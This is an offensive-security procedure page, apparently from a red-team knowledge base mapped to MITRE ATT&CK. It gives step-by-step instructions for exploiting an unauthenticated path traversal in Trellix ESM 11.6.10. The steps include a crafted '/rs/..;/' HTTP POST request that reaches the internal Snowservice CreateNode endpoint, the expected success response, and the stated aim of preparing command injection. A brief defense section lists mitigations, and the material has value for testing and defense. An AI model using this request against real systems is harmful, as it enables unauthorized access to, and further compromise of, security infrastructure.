---
id: proc-trellix-pt-confirm-1
tags:
  - path-traversal
  - unauth-access
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.031Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Confirm-Path-Traversal-Access-to-Snowservice-API

## Summary

This procedure exploits an unauthenticated path traversal vulnerability in the Trellix ESM /rs endpoint to access the internal Snowservice API, bypassing AJP ProxyPass directory restrictions using the '..;/' sequence.

## Description

In Trellix ESM 11.6.10, the AJP ProxyPass configuration ('ProxyPass /rs ajp://localhost:8009/rs') lacks proper path validation, allowing traversal payloads to normalize and reach internal endpoints like /Snowservice/SnowflexAdminServices/CreateNode without authentication. This was tested on the public trial version using HTTP request manipulation.

## Requirements

1. Network access to the ESM web interface on port 80/443
2. [[tools/Burp-Suite]] for request interception and modification
3. Target running Trellix ESM 11.6.10 with exposed /rs endpoint

## Defense

Defensive measures and detection strategies:

- Implement strict path normalization and validation in ProxyPass configurations
- Enable AJP access controls and authentication for internal endpoints
- Monitor for anomalous requests containing '../' sequences to /rs

## Objectives

1. Gain unauthorized access to Snowservice API
2. Confirm traversal bypass effectiveness
3. Set stage for command injection exploitation

## Instructions

### Step 1: Intercept and Modify Request

**Context**: Use Burp Suite to capture a legitimate request to /rs and modify it with traversal payload to target the CreateNode endpoint.

**Command** (HTTP POST via Burp):

No direct command; craft POST request:

```http
POST /rs/..;/Snowservice/SnowflexAdminServices/CreateNode HTTP/1.1
Host: target-esm.com
Content-Type: application/json

{"serverName":"test132","ip":"127.0.0.1","port":"1212","peerPort":"1210"}
```

> This sends a JSON payload to the restricted endpoint. Expected output: HTTP 200 with success JSON, confirming access.

### Step 2: Analyze Response

**Context**: Verify the response indicates successful API interaction without auth errors.

**Command** (Replays in Burp):

Replay the request multiple times to ensure consistency.

> Look for JSON response like {"status":"success"} or similar, indicating bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/Burp-Suite]]

## Tags

- path-traversal
- ajp-bypass
